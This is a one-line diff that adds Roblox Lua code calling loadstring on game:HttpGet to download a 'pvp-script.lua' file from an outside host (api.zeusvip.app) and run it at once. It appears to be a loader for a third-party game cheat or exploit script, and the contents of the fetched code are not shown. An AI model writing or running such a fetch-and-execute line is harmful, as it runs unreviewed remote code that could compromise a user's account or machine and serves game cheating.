@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.zeusvip.app/c/ccd6351241846026-pvp-script.lua"))()
